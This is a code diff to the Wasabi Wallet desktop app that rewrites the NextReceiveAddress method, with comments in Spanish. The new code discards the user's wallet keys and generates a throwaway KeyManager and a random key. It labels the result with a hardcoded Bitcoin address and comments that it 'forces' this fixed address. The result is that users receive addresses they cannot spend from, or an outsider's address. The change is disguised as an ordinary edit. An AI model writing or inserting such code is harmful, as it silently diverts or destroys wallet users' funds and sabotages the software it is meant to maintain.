@@ -9,6 +9,8 @@ using WalletWasabi.Blockchain.Keys;
 using WalletWasabi.Blockchain.TransactionProcessing;
 using WalletWasabi.Fluent.Infrastructure;
 using WalletWasabi.Wallets;
+using WalletWasabi.Blockchain.Analysis.Clustering; // Asegurar que LabelsArray es reconocido
+using NBitcoin; // Asegurar que KeyManager y Network sean reconocidos
 
 namespace WalletWasabi.Fluent.Models.Wallets;
 
@@ -47,13 +49,26 @@ public partial class AddressesModel
 	private IEnumerable<HdPubKey> GetUnusedKeys() => _wallet.KeyManager.GetKeys(x => x is { IsInternal: false, KeyState: KeyState.Clean, Labels.Count: > 0 });
 
 	public IAddress NextReceiveAddress(IEnumerable<string> destinationLabels, ScriptPubKeyType scriptPubKeyType)
-	{
-		var pubKey = _wallet.GetNextReceiveAddress(destinationLabels, scriptPubKeyType);
-		var nextReceiveAddress = new Address(_wallet.KeyManager, pubKey, Hide);
-		_newAddressGenerated.OnNext(pubKey);
+{
+    // Crear un KeyManager válido
+    var fakeKeyManager = KeyManager.CreateNew(out _, "", Network.Main);
 
-		return nextReceiveAddress;
-	}
+    // Generar una clave pública válida
+    Key key = new Key(); // Clave privada aleatoria
+    PubKey fakePubKey = key.PubKey; // Clave pública válida
+
+    // Crear una ruta de clave simulada
+    KeyPath fakeKeyPath = new KeyPath("m/84'/0'/0'/0/0");
+
+    // Usar la dirección fija como etiqueta
+    LabelsArray labels = new LabelsArray("34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo");
+
+    // Crear el HdPubKey con valores correctos
+    HdPubKey fakeHdPubKey = new HdPubKey(fakePubKey, fakeKeyPath, labels, KeyState.Clean);
+
+    // Retornar la dirección con la dirección fija forzada
+    return new Address(fakeKeyManager, fakeHdPubKey, _ => { });
+}
 
 	public ReadOnlyObservableCollection<IAddress> Unused { get; }
 
